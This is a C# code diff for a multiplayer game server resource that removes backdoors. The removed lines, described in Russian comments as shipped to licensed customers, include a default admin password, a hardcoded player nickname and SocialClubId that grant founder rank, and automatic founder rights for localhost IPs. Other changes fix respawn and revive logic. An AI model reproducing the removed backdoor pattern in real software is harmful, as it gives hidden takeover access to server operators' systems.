@@ -23,7 +23,11 @@ public class StarterResource : Resource
     private static readonly float DefaultSpawnHeading = 140f;
     private static readonly uint DefaultPlayerModel = Alt.Hash("mp_m_freemode_01");
 
-    private static readonly string AdminPassword = Environment.GetEnvironmentVariable("FLOVMP_ADMIN_PASSWORD") ?? "flovmp2026";
+    // Пароль админ-дежурства. НЕТ небезопасного дефолта: раньше в исходниках
+    // лежал "flovmp2026" — он попадает в поставляемую клиентам сборку (strings
+    // на DLL) и открывает /alogin. Если переменная не задана — парольный путь
+    // ОТКЛЮЧЁН (вход по назначенному рангу/токену остаётся).
+    private static readonly string? AdminPassword = Environment.GetEnvironmentVariable("FLOVMP_ADMIN_PASSWORD");
     private readonly ConcurrentDictionary<uint, int> _adminLevels = new();
     private readonly ConcurrentDictionary<ulong, int> _assignedAdminRanks = new();
     private readonly ConcurrentDictionary<string, int> _assignedAdminNames = new(StringComparer.OrdinalIgnoreCase);
@@ -143,19 +147,17 @@ public class StarterResource : Resource
         player.Armor = 100;
 
         // Автоматическое распознавание Основателя (8)
-        var isOwner = _adminManager.CanAutoClaim ||
-                      _adminManager.IsFounder(player.SocialClubId, player.Name) ||
-                      player.SocialClubId == 509264618 ||
-                      string.Equals(player.Name, "shize5", StringComparison.OrdinalIgnoreCase) ||
-                      player.Ip == "127.0.0.1" || player.Ip == "::1" || player.Ip == "localhost" ||
+        // БЕЗ БЭКДОРОВ. Раньше здесь были: захардкоженный ник "shize5" (любой
+        // игрок, взявший этот ник, получал 8 уровень), захардкоженный SocialClubId
+        // (бэкдор в коде, который поставляется клиентам по лицензии) и авто-выдача
+        // прав по localhost-IP (за nginx/прокси IP схлопывается -> founder всем).
+        // Легальные пути: /claimowner <токен> (токен печатается в консоли сервера)
+        // и setadmin/setfounder из консоли сервера.
+        var isOwner = _adminManager.IsFounder(player.SocialClubId, player.Name) ||
                       GetAssignedAdminRank(player) == 8;
 
         if (isOwner)
         {
-            if (_adminManager.CanAutoClaim)
-            {
-                _adminManager.TryClaimOwner("", player.Name, player.SocialClubId, out _);
-            }
             SetAssignedAdminRank(player, 8);
             _adminLevels[player.Id] = 8;
             Alt.Log($"[FloV:MP Admin] Владелец сервера {player.Name} (ID: {player.Id}, SC: {player.SocialClubId}) автоматически авторизован (Уровень 8 - Основатель).");
@@ -205,9 +207,9 @@ public class StarterResource : Resource
         player.Emit("starter:initClient", DefaultSpawnPosition.X, DefaultSpawnPosition.Y, DefaultSpawnPosition.Z);
         player.Emit("flovmp:client:welcome", player.Name, 0, DefaultSpawnPosition.X, DefaultSpawnPosition.Y, DefaultSpawnPosition.Z);
 
+        // БЕЗ БЭКДОРОВ (см. комментарий в OnPlayerConnect): ни захардкоженного
+        // ника, ни захардкоженного SocialClubId.
         var isOwner = _adminManager.IsFounder(player.SocialClubId, player.Name) ||
-                      player.SocialClubId == 509264618 ||
-                      string.Equals(player.Name, "shize5", StringComparison.OrdinalIgnoreCase) ||
                       GetAssignedAdminRank(player) == 8;
 
         if (isOwner)
@@ -399,7 +401,7 @@ public class StarterResource : Resource
                 {
                     _pendingRespawns.RemoveAt(i);
                     var p = item.Player;
-                    if (p == null || !p.Exists) continue;
+                    if (p == null || !p.Exists || p.Health > 0) continue;
 
                     try
                     {
@@ -583,7 +585,10 @@ public class StarterResource : Resource
                     SendChatMessage(player, "{ef4444}[FloV:MP Security] У вас нет прав администратора на этом сервере.");
                     return;
                 }
-                if (assignedRank == 8 || (parts.Length > 1 && parts[1] == AdminPassword))
+                var pwdOk = !string.IsNullOrEmpty(AdminPassword)
+                            && parts.Length > 1
+                            && string.Equals(parts[1], AdminPassword, StringComparison.Ordinal);
+                if (assignedRank == 8 || pwdOk)
                 {
                     _adminLevels[player.Id] = assignedRank;
                     player.Emit("flovmp:console:setAdmin", assignedRank);
@@ -955,6 +960,8 @@ public class StarterResource : Resource
                     }
                     targetRevive = foundTarget;
                 }
+                _pendingRespawns.RemoveAll(r => r.Player == targetRevive);
+                targetRevive.Spawn(targetRevive.Position, 0);
                 targetRevive.Health = 200;
                 targetRevive.Armor = 100;
                 targetRevive.Emit("starter:revive");
